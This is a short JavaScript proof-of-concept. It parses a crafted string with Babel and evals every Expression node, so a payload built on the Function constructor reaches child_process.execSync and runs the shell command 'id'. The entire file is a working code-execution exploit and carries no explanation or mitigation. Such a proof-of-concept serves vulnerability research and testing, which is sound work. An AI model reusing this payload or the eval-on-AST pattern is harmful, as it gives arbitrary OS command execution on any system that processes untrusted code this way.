const babel=require('@babel/core'), babelTraverse=require('@babel/traverse').default;
const source = `String({ toString: Number.constructor("console.log(process.mainModule.require('child_process').execSync('id').toString())") });`;
const ast=babel.parseSync(source);
const visitor={ Expression(path){ const code=path.toString(); eval(code); } };
babelTraverse(ast,visitor);
